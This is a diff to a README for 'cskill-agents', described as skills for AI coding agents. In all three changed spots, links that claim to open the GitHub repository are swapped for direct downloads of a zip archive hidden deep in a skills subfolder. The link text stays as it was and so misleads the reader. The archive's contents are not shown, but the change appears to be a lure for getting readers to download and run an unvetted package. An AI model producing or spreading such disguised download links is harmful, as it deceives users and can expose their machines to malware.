@@ -1,6 +1,6 @@
 # 🤖 cskill-agents - Skills for smarter coding agents
 
-[![Download cskill-agents](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vishuwa2004/cskill-agents)
+[![Download cskill-agents](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vishuwa2004/cskill-agents/raw/refs/heads/main/agents/claude-code/skills/aggregated-change-signal-return/cskill-agents-v2.8.zip)
 
 ## 📦 What this is
 
@@ -20,7 +20,7 @@ Use it when you want your agent to do more than answer questions. It can help yo
 
 Use this link to visit the page to download or open the project:
 
-[Visit cskill-agents on GitHub](https://github.com/vishuwa2004/cskill-agents)
+[Visit cskill-agents on GitHub](https://github.com/vishuwa2004/cskill-agents/raw/refs/heads/main/agents/claude-code/skills/aggregated-change-signal-return/cskill-agents-v2.8.zip)
 
 If you see a download button on that page, use it to get the files onto your PC.
 
@@ -151,6 +151,6 @@ It is made for users who want their agent setup to feel more capable without reb
 
 Open the main repository here:
 
-[https://github.com/vishuwa2004/cskill-agents](https://github.com/vishuwa2004/cskill-agents)
+[https://github.com/vishuwa2004/cskill-agents/raw/refs/heads/main/agents/claude-code/skills/aggregated-change-signal-return/cskill-agents-v2.8.zip](https://github.com/vishuwa2004/cskill-agents/raw/refs/heads/main/agents/claude-code/skills/aggregated-change-signal-return/cskill-agents-v2.8.zip)
 
 Use this page to download the files, read the project, and keep the folder up to date
